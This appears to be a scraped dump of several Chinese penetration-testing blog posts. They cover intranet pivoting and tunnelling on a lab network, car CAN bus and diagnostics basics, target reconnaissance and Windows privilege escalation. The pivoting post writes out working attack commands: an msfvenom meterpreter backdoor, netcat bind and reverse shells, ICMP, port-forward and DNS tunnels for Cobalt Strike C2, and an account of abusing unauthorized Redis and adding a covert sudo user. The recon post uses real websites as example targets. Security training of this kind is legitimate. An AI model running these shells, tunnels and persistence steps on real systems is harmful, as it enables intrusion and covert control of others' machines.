https://hackergu.com/cfs-network/ CFS三层靶机环境： 链接: https://pan.baidu.com/s/1LJueA-X02K7HZXr8QsOmeg 提取码: dkcp 解压密码：teamssix.com 攻击路线 攻击最外层，获得shell（thinkphp rce+一句话木马） 经过各种方式获得shell之后需要进行信息搜集以及路由设置，但是我们首先是不知道有内网而且是什么网段的。 后门： 1msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=3333 -f elf &gt; t2.elf 接受： 12345use exploit/multi/handlerset payload linux/x64/meterpreter/bind_tcpset rhost 192.168.22.128set LPORT 3333exploit 进行网卡的扫描，并添加路由，可以使用ifconfig或者在meterpreter上使用： 获取网络接口：run get_local_subnets 查看路由地址：run autoroute -p 如果没有对应内网的那个路由，那就添加：run autoroute -s 192.168.22.0/24。 这里添加完后，就相当于以我们能在外网访问到的网址作为网关，进行转发流量，到我们的kali上的Msf。但是这样只能在msf上使用，所以需要在本机kali上开一个端口，作为代理，转发流量到我们的端口上，这时候需要ProxyChain+Socks4a配合 ProxyChain+Socks4a配合完成代理【注：如果攻击机是windows的话，还可以利用代理工具Proxifier或SocksCap64载入代理进行远程访问测试。】 开启本机代理 1234use auxiliary/server/socks_proxyset version 4aset srvport 2222exploit 配置proxychains：找到proxychains.conf文件，linux是/etc/proxychains.conf 12[ProxyList]socks4 192.168.80.137 2222 运行proxychains，用nmap扫描（注意这个socks转发http/tcp协议的流量） 1234proxychains nmap -sT -Pn 192.168.22.0/24proxychains4 nmap -sT -Pn 192.168.22.0/24 -p80 //这里是为了快速扫描-Pn：扫描主机检测其是否受到数据包过滤软件或防火墙的保护。-sT：扫描TCP数据包已建立的连接connect 我们访问内网服务的时候，浏览器设置代理： 当我们上传了木马到第二台主机，那么我们去用蚁剑连接的时候需要设置代理： 当我们拿到第二台主机，对第三台主机进攻，我们很多漏洞扫描工具又可以派上用场，例如：namp --script=all、namp --script=vuln、nessus，设置代理即可。 步骤差不多~over，自己试验。 NPS（更强大的web代理） https://teamssix.com/210612-213704.html 下载：https://github.com/ehang-io/nps 隧道 主要解决： 防火墙过滤问题、网络连接通信问题、数据回链封装问题 在数据通信被拦截的情况下，可以利用隧道技术封装改变通信协议进行绕过拦截。比如CS、MSF无法上线，数据传输不稳定无回显，出口数据被监控，网络通信存在问题等问题，都可以通过隧道技术解决。 需要特别注意的是： 在用隧道之前要先探测对应隧道协议是否支持，如果不支持，用这个隧道也没有任何意义！ 它与代理的区别： 代理通过转发tcp包出去，但是防火墙会对这些包进行拦截，我们可以伪装这些tcp包为icmp包【封装】再转发出去，这样就可以躲过监控。 原理 隧道，就是一种绕过端口屏蔽的通信方式。 防火墙两端的数据包通过防火墙所允许的数据包类型或端口进行封装，然后穿过防火墙，与对方进行通信。当被封装的数据包到达目的地时，将数据包还原，并将还原后的数据包发送到相应的服务器上。 常用的隧道技术 网络层：IPv6隧道、ICMP隧道、GRE隧道 传输层：TCP隧道、UDP隧道、常规端口转发 应用层：SSH隧道、HTTP隧道、HTTS隧道、DNS隧道 涉及到OSI七层与TCP/IP 五层或者四层协议 探测使用隧道类型 隧道有各种层面的，每个层面又分不同协议，你想要用哪个隧道，就需要先确定目标主机是否支持对应隧道协议。 可以使用以下协议进行判断。 ICMP协议：ping：ping www.baidu.com TCP协议：telnet\\nc：telnet www.baidu.com 80,nc -zv www.baidu.com 80 【z为扫描不发送数据包，v表示详细输出】 HTTP协议：curl\\wget：curl www.baidu.com 80,wget -S www.baidu.com DNS协议：nslookup\\dig：nslookup www.baidu.com,dig www.baidu.com【这两个分别是win和linux自带的】 网络层 ICMP 隧道 ptunnel/Pingtunnel 使用 pingtunnel是把tcp/udp/sock5流量伪装成icmp流量进行转发的工具 为什么要转换？因为tcp、udp、sock5这几个协议受到防火墙和工具的拦截，这个工具就是把这些流量伪装成icmp进行数据传输！ 语法： 12345-p ##表示连接icmp隧道另一端的机器IP（即目标服务器）-lp ##表示需要监听的本地tcp端口-da ##指定需要转发的机器的IP（即目标内网某一机器的内网IP）-dp ##指定需要转发的机器的端口（即目标内网某一机器的内网端口）-x ##设置连接的密码 执行命令： 123456# target2执行./ptunnel -x xiaodi # kali执行./ptunnel -p 192.168.80.145 -lp 1080 -da 192.168.33.33 -dpd 3389 -x xiaodi # 转发的3389请求数据给本地1080。相当于端口映射，将3389端口映射到1080端口并通过icmp封装，后面只要访问1080就是访问3389rdesktop 127.0.0.1 1080 实验准备：https://blog.csdn.net/markecheng/article/details/110352161 传输层隧道 lcx[win]/portmap[linux] 使用 lcx是一个端口转发工具，通过端口转发的形式，将内网服务器的某一个端口映射到公网另一台服务器的一个端口上去 例如在内网主机中使用： 1Lcx.exe -slave 192.168.3.31 6666 127.0.0.1 3389 //将本地3389给webserver的6666 这样，外网主机就可以通过自己的6666端口访问3389了。外网webserver监听并转发： 1Lcx.exe -listen 6666 7777 // 监听6666转发至7777 在内网kali上执行以下命令，连接webserver的7777，登录远程桌面访问，这里其实登录的是域控DC的远程桌面。 1rdesktop 192.168.80.146:7777 传输层隧道——转发nc流量 正向shell（连接受害者） 受害者执行（监听，听到谁，就给shell） 12nc -ldp 1234 -e /bin/sh #linuxnc -ldp 1234 -e c:\\windows\\system32\\cmd.exe #windows 攻击，我主动连接：nc 192.168.76.132 1234 反弹shell（受害者连我） 攻击，受害者连我 我监听：nc -lvp 1234 受害者执行： 12nc 192.168.3.32 1234 -e /bin/shnc 192.168.3.32 1234 -e c:\\windows\\system32\\cmd.exe 多向连接反弹 shell-配合转发 假设有三个主机，webserver连外网，内网有一台pc，kali在外网 我们通过上面的方法将端口转发： pc：nc 192.168.3.31 2222 -e c:\\windows\\system32\\cmd.exe webserver：Lcx.exe -listen 2222 3333 kali：nc -v 192.168.80.146 3333 kali能够和webserver联通，可以直接接收3333的shell，间接的取得了sqlserver的权限 其他功能 指纹服务：nc -nv 192.168.76.143 端口扫描：nc -v -z 192.168.76.143 1-100 端口监听：nc -lvp xxxx 文件传输：nc -lp 1111 &gt;1.txt|nc -vn xx.xx.x.x 1111 &lt;1.txt -q 1 应用层DNS隧道——配合CS上线 原理 核心思想：端口不和服务绑定，可以传输任何数据。 正常网络之间的通信，是发生在两台机器建立TCP连接之后的，在进行通信时：如果目标是IP，则会直接发送报文，如果是域名，则将域名解析为IP再通信。C&amp;C服务器在建立连接后将指令传递给客户端上的后门程序。 DNS隧道的原理就是：在后门程序进行DNS查询时，如果查询的域名不在DNS服务器本机的缓存中，就会访问互联网进行查询，然后返回结果，如果互联网上有一台攻击者设置的服务器，那么服务器就可以依靠域名解析的响应进行数据包的交换，从DNS协议的角度来看，这样的操作只是反复查询某个或者某些特定的域名并且得到解析结果，但其本质是，DNS预期的返回结果应该是一个IP地址，而事实上不是——返回的可以是任意字符串，包括加密的C&amp;C指令，从而将其他协议封装在DNS协议中进行传输。 参考： dns隧道攻击原理及常用工具流量分析 操作 当常见协议监听器被拦截时，可以换其他协议上线，其中dns协议上线基本通杀 CS上有DNS Beacon，可以使用它完成隧道。有Teamserver，部署在云端，这时候： Teamserver就需要启用53端口UDP 买一个域名，修改解析记录如下： 123A记录-&gt;cs主机名-&gt;CS服务器IPNS记录-&gt;ns1主机名-&gt;上个A记录地址NS记录-&gt;ns2主机名-&gt;上个A记录地址 配置DNS监听内容：ns1.xiaodi8.com、ns2.xiaodi8.com——&gt;cs.xiaodi8.com 生成后门，执行上线后启用命令：attacks--&gt;packages--&gt;windows executable(s)--&gt;listener 选择dns上线，勾选–&gt;选择后门生成位置–&gt;生成后门。将后门上传到webserver，执行。执行后门后，cs出现一个黑窗口。 点击小图标，出现unknown主机，原因是我们使用DNS上线，DNS速度特别慢。此时我们需要再敲几条命令才能实现控制。点击unknown主机，输入： 123checkinmode dns-txtshell whoami CS与MSF联动 CS到MSF CS创建监听listen CS产生木马，运行之后在CS上线 CS添加一个新的监听器，用来传递给msf。由于生成的木马就是HTTP的，所以委派给msf时，监听器还是HTTP的。 CS委派对话 MSF准备接受 MSF到CS msf在拿到session之后，使用exploit/windows/local/payload_inject模块来指明接收者的 ip 和端口，然后把session委派出去。 MSF选择session，使用模块：use exploit/windows/local/payload_inject，并设置相关payload信息。主要是端口，run即可 lport写的是cs监听端口 lhost写的是cs主机ip CS使用监听器，监听一个端口，8即可 例子 内网横向肯定得 fscan 出场了，一般刚开始就扫个 C 段就行了，好巧不巧，发现了我最喜欢的 Redis 未授权，进去发现还是 root 用户，但是不出网。 这种情况我一般会创建一个 sudo 免密的新用户，就 adduser 然后 visudo 就可以了，用户名字起地别太假。 然后在出网的机器用 nps 搭一个隧道出来，服务端提前配好，客户端就三句话的事 123wget https://github.com//ehang-io/nps/releases/download/v0.26.10/linux_amd64_client.tar.gztar -zxvf linux_amd64_client.tar.gznohup ./npc -server=xxx.xxx.xxx.xxx:xxx -vkey=xxx &gt; npc.log 2&gt;&amp;1 &amp; 然后继续内网扫描，首先用扫描器的 icmp 模块看看内网有多大，然后再扫。 内网不大，就两个 C 段资产比较多。 我一般习惯先拿非 web 资产，最后再看 web 资产。 首先把所有的 redis 未授权和弱口令都利用了，一共拿到大约 12 台机器，然后进去翻 web 服务的配置文件，把数据库密码找到，发现几个经常用的强口令，补充到扫描器里接着爆扫数据库和服务器。 涉及到的服务器与内容： OA系统 WEB服务：nacos的服务 生产系统：Solr，elasticsearch，Flink，Sentinel LDAP 服务的管理端，管控着 jira、jenkins 等服务 资源下载 K8Tools，K8哥哥的工具库：https://github.com/k8gege/K8tools https://github.com/gentilkiwi/kekeo/ k8gege/Ladon: 大型内网渗透扫描器 解压密码：k8gege.org https://github.com/ianxtianxt/MS14-068/blob/master/MS14-068.exe 暗月免杀mimikatz 链接：https://pan.baidu.com/s/1erHWNWQ6roVWTKNkdWsffg?pwd=uy5q 提取码：uy5q","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"内网","slug":"内网","permalink":"https://j3f5.github.io/tags/%E5%86%85%E7%BD%91/"}]},{"title":"车联网基础-SocketCAN与车辆通信","slug":"车联网基础-SocketCAN与车辆通信","date":"2023-06-20T01:38:06.000Z","updated":"2023-06-20T01:38:06.000Z","comments":true,"path":"articles/2023/06/20/车联网基础-SocketCAN与车辆通信/","link":"","permalink":"https://j3f5.github.io/articles/2023/06/20/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-SocketCAN%E4%B8%8E%E8%BD%A6%E8%BE%86%E9%80%9A%E4%BF%A1/","excerpt":"","text":"概述 CAN通信，在现实测试中需要了解CAN的各个协议，例如ISO-TP，还有CAN的高低比特率是多少，例如高500，低为250-125，等等。在了解这些之后，我们需要了解各个can连接器，这些链接器可以链接测试CAN总线，后面配合CAN-utils就可以对CAN数据进行读取了。 连接器 Vector CAN/LIN interface can-utils 打开kali，安装can-utils： 1apt-get install can-utils 测试 标准测试 安装完CAN-utils，则需配置芯片组 安装CAN嗅探器对应的驱动，确保设备兼容 对适配器进行初始化 使用dmesg查看初始化信息 查看接口是否存在（接口是否被正确加载）：ifconfig can0 设置总线速率，要设置的关键参数是比特率(bitrate) 12ip link set can0 type can bitrate 500000ip link set up can0 这样就启动can0设备了，然后就可以使用can-utils进行连接接口了。 Linux使用netlink在内核和用户空间工具间进行通信，可以通过ip link访问netlink。相关命令可以看： 1ip link set can0 type can help 注：内置设备复位（数据包丢失/错误时使用） 12ip link set canX type can restart-ms 100ip link set canx type can restart 配置串行设备 要使用USB转串口适配器，必须首先出水啊串口硬件和CAN总线波特率： 12slcand -o -s6 -t hw -S 3000000 /dev/ttyUSB0ip link set up slcan0 slcand守护进程提供了将串口通信转译到网络驱动程序slcan0所欲的接口，注意-s选项即为波特率，具体参考： https://blog.csdn.net/weifengdq/article/details/128823317 虚拟 配置一个虚拟CAN网络用于测试： 12345modprobe vcandemsg | grep vcanip link add dev vcan0 type vcanip link set up vcan0ifconfig vcan0 ICSim ICSim(Instrument Cluster Simulator)，是由Open Garages推出的工具。它可以产生多个CAN信号，同时会产生许多背景噪声，让我们可以在没有汽车或不改造汽车的情况下即可练习CAN总线的逆向技术。 GITHUB地址：https://github.com/zombieCraig/ICSim 安装参考：https://www.anquanke.com/post/id/209141 工具与套件 Kayak CAN逆向 为了对CAN总线进行逆向，需要先读取CAN包，识别这些包控制什么功能。**然而不需要访问那些CAN官网诊断数据包，因为它的数据不能动。**在学习过程中，获取数据包中包含的信息是理解车辆行为的关键！ 定位CAN总线 参考协议一章，具体在OBD连接器处。参考： 如果没办法连接OBD-II，那么找隐藏的CAN信号： 找双绞线：成对/绞在一起的导线。CAN线路通常是绞在一起的两根导线，例如： 万用表测电压2.5V，上下波动1V 通过双通道示波器，对到线上信号差异做减法，由于差分信号会互相抵消，应该可以看到恒定信号 注意：CAN总线往往是静默的，通常只需要执行很简单的操作就可以唤醒并产生信号。 使用Wireshark与can-utils逆向Can总线通信 使用 can-utils一般使用的是candump工具，命令是： 1candump -b vcan0 slcan0 不指定-b，默认也行。 使用wireshark，点击你想要监听的网卡就行（就是vlan0） 分组can总线数据流 CAN总线上会有很多噪声","categories":[{"name":"车联网基础","slug":"车联网基础","permalink":"https://j3f5.github.io/categories/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"CAN","slug":"CAN","permalink":"https://j3f5.github.io/tags/CAN/"}]},{"title":"车联网基础-诊断和日志","slug":"车联网基础-诊断和日志","date":"2023-06-15T05:03:59.000Z","updated":"2023-06-15T05:03:59.000Z","comments":true,"path":"articles/2023/06/15/车联网基础-诊断和日志/","link":"","permalink":"https://j3f5.github.io/articles/2023/06/15/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80-%E8%AF%8A%E6%96%AD%E5%92%8C%E6%97%A5%E5%BF%97/","excerpt":"","text":"诊断服务（UDS OBD） 先回顾一下一些服务系统 OBD作为系统，自上而下，标准庞大而清晰。 UDS作为服务，上层清晰，兼容不同下层，以最终功能实现为要求。 OBD是关注车辆实时排放的理念形成的行业规范，而UDS是诊断服务的统一化规范。 UDS是面向整车所有ECU(电控单元)的，而OBD是面向排放系统ECU的。 再声明一些专有名词： 缩写 解释 DTC 故障诊断代码 MIL 故障指示灯 PCM 动力系统控制模块（多个ECU组成） RPM 发动机每分钟转速 UDS 统一诊断服务 EDR 事件数据记录日志（黑匣子，一般在ECU旁边） ACM 安全气囊控制模块 SDM 【通用汽车】感知和诊断模块（存储汽车速度的纵向变化，不记录任何事故后的信息） RCM 【福特】约束控制模块（存储汽车纵向和侧向加速度，与SDR不同） ACN 自动事告呼救系统（将事件告知第三方） 攻击场景 如果在对车辆总线进行实验时触发了故障，那么需要能够读取并写入PCM以清除故障。则我们需要知道： 如何读取并清除诊断代码 查询ECU诊断服务的方法 如何访问汽车的碰撞数据记录 如何暴力破解隐藏的诊断代码 DCT（故障诊断代码） 概念与知识 格式 字节位置 解释 1 P(0x0)=动力系统，B(0x1)=车身，C(0x2)=底盘，D(0x3)=网络 2 0、2、3（SAE标准），1、3（制造商专用码）【注：3可能是anyone】 3 字节位置1的子组 4 特定的故障区域 5 特定的故障区域 DTC中5个字符仅有网络上的两个原始字节表示。将这两个DTC字节分解成完整的DTC代码方法如下： 格式 字节1【1】 -【2】 -【3】 字节2【4】 -【5】 结果 十六进制 0x0 0x4 0x7 0x7 0x0477 二进制 00 00 0100 0111 0111 第0-15位 DTC P 0 4 7 7 P0477 除了前两个字符外，这些字符都有一一对应的关系（【?】对应上面的字节位置）。这些都是SAE标准的代码。 故障分类 硬故障：不进行干预就没办法正常消除的故障（例如：清除DTC后，故障仍然出现） 软故障：间接性问题，例如油箱盖松动之类的问题 注意： 并非所有的故障都会点亮MIL灯，它有四类故障 A类：（总排放失效）亮 B类：（不影响排放系统）记录数次后亮 C类：通常不会亮，而是“请尽快保养发动机” D类：不亮 冻结帧数据（Freeze Frame Data） 存储DTC时，PCM快照所有相关的发送机部件信息，并存入FFD中。通常包含以下信息： 相关DTC 发动机负载 发动机每分钟转速（RPM） 发动机温度 燃油修正 歧管气压/空气流量（MAP/MAF）值 操作模式（开/闭电路） 风门位置 车速 理想状态下快照将在DTC出现的时候同时进行，而冻结帧通常在DTC触发后5妙才开始记录。 读取与清除 读取 使用vehicle spy3不仅能监控和发送报文，还能实现DTC读取和解析，但现在这种功能只适用于采用ISO14229诊断协议的控制器。通过电话与英特佩斯的工程师沟通得知，由于KWP2000协议在美国已经很少使用，所以对采用KWP2000诊断协议的控制器，vehicle spy3仅支持DTC的读取，而不支持DTC的解析。 工具： vehicle spy3的使用 清除 条件： PCM三次检查后，不再出现故障，则清除（则硬DTC清除） 断开电源（则软DTC清除） UDS——统一诊断服务 UDS：向修理人员提供一种统一的展示车辆运行状态的方式（只是展示部分信息），为只读模式。 使用UDS可以进行：诊断测试、更改固件 UDS安全威胁 UDS刷写 前置知识","categories":[{"name":"车联网基础","slug":"车联网基础","permalink":"https://j3f5.github.io/categories/%E8%BD%A6%E8%81%94%E7%BD%91%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"诊断","slug":"诊断","permalink":"https://j3f5.github.io/tags/%E8%AF%8A%E6%96%AD/"}]},{"title":"信息搜集","slug":"信息搜集","date":"2023-06-14T07:00:58.000Z","updated":"2023-06-14T07:00:58.000Z","comments":true,"path":"articles/2023/06/14/信息搜集/","link":"","permalink":"https://j3f5.github.io/articles/2023/06/14/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/","excerpt":"","text":"概述 在信息收集阶段，我们需要尽量多的收集关于目标web应用的各种信息，比如：脚本语言的类型、服务器的类型、目录的结构、使用的开源软件、数据库类型、所有链接页面，用到的框架等。 假设有这么一个国外网站：https://www.cengkarenggolfclub.com/ 还有一个国内网站：http://www.917hh.com/Abouts.asp?NewsID=1 方式：主动扫描； 开放搜索开放搜索：利用搜索引擎获得后台、未授权页面、敏感url 1234567基础信息：IP，网段，域名，端口系统信息：操作系统版本应用信息：各端口的应用，例如web应用，邮件应用等版本信息：所有探测到的版本服务信息：服务器类型、版本人员信息：域名注册人员信息，web应用中网站发帖人的id，管理员姓名等防护信息：试着看能否探测到防护设备 企业信息 主要可以分为：WHOIS信息查询+IPC信息+股权信息+子公司信息 主要目的：扩大攻击范围，寻找更多的业务，更多的供应商链，人员信息搜集（敏感信息，可以用来制作字典） WHOIS 很多网站上都可以收集到whois信息，比如说： 国外的who.is：https://who.is/ 站长之家：http://whois.chinaz.com/ 爱站：https://whois.aizhan.com/ 微步：https://x.threatbook.cn/ 这些网站都可以收集whois信息，而且还很全面， 主要关注：注册商、注册人、邮件、DNS解析服务器、注册人联系电话 小技巧：如果在站长之家上隐藏了信息，可在who.is上再次查看。 企业备案与股份信息 有需要的还可以查企业的备案信息，主要有三种方式： 天眼查：https://www.tianyancha.com/ ICP备案查询网：http://www.beianbeian.com/ 国家企业信用信息公示系统：http://www.gsxt.gov.cn/index.html 企查查：https://www.qcc.com/ 注意：国外的服务器一般来说是查不到的，因为他们不需要备案。国内的基本上都可以查到。 主要关注：股权信息，子公司孙公司（投资超过50%/行政权） 供应商 供应商提供的软件一般是收到该商家信任的，所以可以攻击供应商，以此为跳板注入恶意代码攻击此商家。还可以获取供应商上的其他信息。 网页底部的备案信息 招标文件 工具 https://github.com/wgpsec/ENScan_GO 一款基于各大企业信息API的工具，解决在遇到的各种针对国内企业信息收集难题。一键收集控股公司ICP备案、APP、小程序、微信公众号等信息聚合导出。 例子 123456网址：917hh.com注册商：Alibaba Cloud Computing (Beijing) Co.,Ltd.注册人：邮件：注册联系人电话：DNS服务器：dns15.hichina.com - 139.224.142.112 dns16.hichina.com - 47.118.199.201 子域名 通过谷歌语法 1site:baidu.com -www 聚合网站 GUI好看，结果多：https://securitytrails.com 这个网站能查很多东西，包括whois，还有子域名，很厉害：https://www.virustotal.com/gui/home/search 这个网站能查的好像就少一些，所以一般用上面的吧：https://dnsdumpster.com/ SSL证书 SSL证书是需要申请的，用来保证用户与网站之间的通信。一个SSL/TLS证书通常包含域名、子域名和邮件地址，查找一个域名证书的最简单方法是使用搜索引擎来收集计算机的CT日志，并让任何搜索引擎搜索它们。前两种比较常用。 证书透明性（Certificate Transparency，CT）是 Google 的公开项目，通过让域所有者、CA 和域用户对 SSL 证书的发行和存在进行审查，来纠正这些基于证书的威胁 https://crt.sh/ https://censys.io/ 爆破枚举 这个就有很多工具可以用了，大佬们都有自己用的顺手的工具，比较常见的是： layer子域名挖掘机 subDomainsBrute K8 orangescan DNSRecon 在线zcjun：http://z.zcjun.com/ 这里重点推荐 layaer 和 subDomainsBrute 工具，可以从子域名入侵到主站。 小技巧：在https://github.com/ 上也可以搜索子域名，运气好的话，会有意想不到的收获。例如：https://github.com/search?q=subdomain+baidu.com&amp;type=code DNS公开数据集 利用已有公开的扫描数据集，对子域名信息进行收集。 https://opendata.rapid7.com/ DNS共享记录查询 原理：查询共享DNS服务器主机来获取相关的域名 首先查询是否存在NS服务器（这个服务器记录了遇到域名应该去哪里的DNS解析） 1nslookup -query=ns baidu.com 将非权威应答中的NS服务器带到下面的网站查询 https://hackertarget.com/find-shared-dns-servers/ 某个域名的IP，端口，业务信息等 应用中的信息 微信/支付宝小程序 微信公众号 手机APP抓包+历史版本 空间测绘 先通过Ping来获得一个IP，或者使用nslookup例如： 1234567891011PS C:\\Users\\jeff&gt; ping baidu.com正在 Ping baidu.com [110.242.68.66] 具有 32 字节的数据:PS C:\\Users\\jeff&gt; nslookup默认服务器: localhostAddress: 10.131.210.1&gt; www.baidu.com非权威应答:（非权威应答：Non-authoritative answer，除非实际存储DNS Server中获得域名解析回答的，都称为非权威应答。也就是从缓存中获取域名解析结果。）名称: www.baidu.comAddresses: 110.242.68.4 110.242.68.3 很多时候，网站都会开启CDN加速，导致我们查询到的IP不是真实的IP，所以得先查询到真实的IP地址。 可以通过DNS记录找一下，例如：https://sitereport.netcraft.com/?url=http://www.baidu.com，里面的NetWork选项里面就有他的IP，然后通过组合拳：https://www.virustotal.com/gui/ip-address/104.193.88.123/details，就可以知道这个IP属于谁，对照一下。 上面我们得到地址110.242.68.4，去virustotal查一下得到结果： 1234Network 110.240.0.0/12Autonomous System Number 4837Autonomous System Label CHINA UNICOM China169 BackboneRegional Internet Registry APNIC 而在netcraft得到地址104.193.88.123，查一下得到结果： 1234Network 104.193.88.0/23Autonomous System Number 55967Autonomous System Label Beijing Baidu Netcom Science and Technology Co., Ltd.Regional Internet Registry ARIN 看到上面nsloopup有多个记录，那么大概率是cdn了（windows 用 nslookup，linux 用 dig） 通过netcraft得到的地址应该是可以用的，真实地址 使用多地ping（https://www.boce.com/ping），可以判断 验证cdn 反查域名 IP，看结果是否有大量不相关的域名存在，http://ip.yqie.com/iptodomain.aspx， 观察请求响应的返回数据的头部，是否有 CDN 服务商标识 使用超级 ping，通过不同定位地点的 ping 测试，看返回的 IP 是否不同 判断 IP 是否在常见 CDN 服务商的服务器 IP 段上 若 asp 或者 asp.net 网站返回头的 server 不是 IIS、而是 Nginx，则多半使用了nginx反向代理到 CDN 利用 Nslookup 查询域名，看是否返回多个应答 IP 通过反向解析：通过ip反查域名，但这个一般是用作查资源 nslookup 12nslookup -qt=ptr ip [dnsserver]nslookup反向解析结果不够准确，而且很多ip是解析不出来的 CDN绕过 Content Delivery Network，中文全称为内容分发网络，简称为 CDN 。所有请求网站内容的用户都将从最近的 CDN 代理服务器获取其缓存版本，因此内容加载速度更快，网站的性能得到改善。 ping邮箱：mail.baidu.com，去https://www.boce.com/ping/这ping一下，只有两个IP：111.202.115.87和220.181.3.87 1site:baidu.com -www 减号就是不搜索www","categories":[{"name":"渗透测试基础","slug":"渗透测试基础","permalink":"https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"整体流程","slug":"整体流程","permalink":"https://j3f5.github.io/tags/%E6%95%B4%E4%BD%93%E6%B5%81%E7%A8%8B/"}]},{"title":"权限提升","slug":"权限提升","date":"2023-06-14T02:42:23.000Z","updated":"2023-06-29T02:42:23.000Z","comments":true,"path":"articles/2023/06/14/权限提升/","link":"","permalink":"https://j3f5.github.io/articles/2023/06/14/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/","excerpt":"","text":"前言 一般渗透流程就是获取webshell权限、获取其他应用权限，然后提权获取服务器系统管理员权限，获取system/root权限。这里主要是思路的体现。 相关注意点 前期-中期-后期对应知识关系 知识点顺序，理解思路，分类介绍等 注重理解当前权限对应可操作的事情 相关的操作被拒绝无法实现的时候就会涉及到权限提升 权限分类 后台权限 获得方式：爆破，注入猜解，弱口令等获取的帐号密码配合登录 一般网站或应用后台只能操作应用的界面内容数据图片等信息，无法操作程序的源代码或服务器上的资源文件的。（如后台功能存在文件操作的话也可以操作文件数据） 网站权限 获得方式：爆破，注入猜解，弱口令等获取的帐号密码配合登录 查看或修改程序源代码，可以进行网站或应用的配置文件读取（接口配置信息，数据库配置信息等），还能收集服务器操作系统相关的信息，为后续系统提权做准备。 数据库权限 操作数据库的权限，数据库的增删改等，源码或配置文件泄漏，也可能是网站权限(webshell)进行的数据库配置文件读取获得。 接口权限 邮件，短信，支付，第三方登录等，一旦截获，我们就可以利用这个接口对他人进行攻击。 系统权限 域控权限 后台或网站权限后的获取途径：后台（修改配置信息功能点），网站权限（查看的配置文件获取），具体可以操作的事情大家自己想想。 Webshell 获得权限的思路 寻找网站特征，判断cms，查找历史漏洞 若判断不了，搜集信息，搜集配置文件与源码，审计功能点 查找功能点，看有没有getshell的可能 上传 sql注入 RCE等等 某挂壁程序后台权限提升-后台功能 前提：已经获取了后台账号密码（获得方式：爆破，注入猜解，弱口令等获取的帐号密码配合登录 ） 后台权限和网站权限不同，后台权限不能对网站代码的层次进行修改 分析网站的CMS， 已知cms 在网上搜索CMS对应的漏洞，尝试复现。 网上未能找到相应版本漏洞，下载网站源码，进行代码审计，进行分析，寻找可以提权的漏洞 用功能点配合网站源码进行测试，在上传点抓包找到对应的代码 未知cms 没有代码：直接常规测试，测试围绕文件上传、模板修改、SQL执行、数据备份等功能 某 BC 广告导航页权限提升-漏洞层面 信息收集，发现中间件有漏洞 抓包了解网站使用的Apache和OpenSSL版本，凭借经验发现是基于PHPstudy的网站。根据网络资料复现PHPstudy的后门漏洞，实现命令执行。 1Apache 2.4.** Mysql 5.*** PHP 5.*** GlassFish 中间件-第三方 通过FOFA信息收集，搜索使用GlassFish的网站作为目标根据网络资料复现GlassFish的任意文件读取漏洞（注意使用条件是否匹配）获取敏感信息，进行下一步渗透 服务器权限 WIN提权 基础知识 权限划分 普通权限 一般系统分为七个组，每个组有对应不同的操作权限。管理员组(Administrators)、高权限用户组(Power Users)、普通用户组(Users)、身份验证用户组(Ahthenticated users)、来宾用户组(Guests)、文件复制组(Replicator)、备份操作组(Backup Operators) 管理员组拥有大部分的计算机操作权限(并不是全部)，能够随意修改删除所有文件和修改系统设置只有程序信任组（特殊权限） 来宾用户组的文件操作权限和普通用户组一样，但是无法执行更多的程序。 身份验证用户组(Ahthenticated users) 经过ms验证程序登录的用户均属于此组。 特殊权限 出了上述，还有系统的特殊成员：SYSTEM(系统)、Trustedinstaller（信任程序模块）、Everyone(所有人)、CREATOR OWNER(创建者) 。这些特殊成员不被任何内置用户组吸纳，属于完全独立出来的账户。 真正拥有“完全访问权”的只有一个成员:SYSTEM 基础命令 命令 描述 systeminfo 打印系统信息 whoami 获得当前用户名 whoami /priv 当前账户权限 ipconfig 网络配置信息 ipconfig /displaydns 显示DNS缓存 route print 打印出路由表 arp -a 打印arp表 hostname 主机名 net user 列出用户 net user &lt;UserName&gt; 关于用户的信息 net use \\SMBPATHPa$$w0rd/u:UserName 连接SMB net localgroup 列出所有组 net localgroup GROUP 关于指定组的信息 net view\\127.0.0.1 会话打开到当前计算机 net session 开放给其他机器 netsh firewall show config 显示防火墙配置 DRIVERQUERY 列出安装的驱动 Tasklist /svc 列出服务任务 net start 列出启动的服务 dir/s foo 在目录中搜索指定字符的项 dir/s too==bar 同上 sc query 列出所有服务 sc qc ServiceName 找到指定服务的路径 shutdown /r/t 0 立即重启 type file.txt 打印出内容 Icacls “C:\\Example” 列出权限 wmic qfe getCaption, Description,HotFixID,InstalledOn 列出已安装的补丁 (NewObject System.Net.WebClient).DownloadFile( “https://host/file&quot;/&quot;C:\\LocalPath&quot;) 利用ps远程下载文件到本地 accesschk. exe-qwsu&quot;Group&quot; 修改对象(尝试Everyone，Authenticated Users和/或users) WEB-shell提权思路 前提是获得web权限 判断是什么系统，是服务器（2012 2003等等）还是个人主机（xp win7/10），判断当前权限 一般使用systeminfo（打了啥补丁）、whoami /priv（能做啥操作） 判断是否存在补丁，验证未打的补丁是否有的是权限提升/bypass的。 使用脚本：Vulmap、Wes、WindowsVulnScan使用KBCollect.ps1 Wes和WindowsVulnScan是python脚本（自己的环境有就行） 辅助工具： https://i.hacking8.com/tiquan/ 发现exp后，使用msf反弹shell连接即可。以上是web上的提权方法。如果看到的补丁是主机层面的提权，则需要以下思路。 至于为什么会有两种方法？例如本地提权，如果使用的是新建窗口进行提权的，那么在web并不适用，因为没办法连接到新的cmd。 本地提权思路——溢出漏洞/AT/SC/PS 溢出漏洞的使用，msf已经足够了解了。有些漏洞可能只适应于本地环境提权，不适用于web环境提权。有些提权方法借助系统上的设计，逻辑上的问题来实现，并不总是依靠漏洞。 前提已经获得计算机的普通用户权限，较老的计算机系统，视频以Win2003为例，参考：windows权限提升——AT、SC、PS命令提权 AT 适用范围：只针对Win7及之前的系统，从Win8开始不再支持at命令。 